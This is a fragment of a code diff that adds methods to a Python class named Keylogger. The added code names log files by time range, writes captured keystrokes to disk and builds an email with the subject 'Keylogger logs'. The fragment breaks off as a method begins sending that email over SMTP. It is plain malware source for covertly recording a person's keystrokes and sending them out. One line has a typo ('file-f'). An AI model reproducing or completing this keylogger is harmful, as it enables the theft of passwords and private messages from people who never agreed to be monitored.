@@ -39,4 +39,26 @@ class Keylogger:
 
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file-f)
+        print(f"[+] Saved {self.filename}.txt")
+    
+    def prepare_mail(self, message):
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger logs"
+        html = f"<p>{message}</p>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+        return msg.as_string()
+    
+    def sendmail(self, email, message, verbose=1):
+        server = smtplib.SMTP()
 
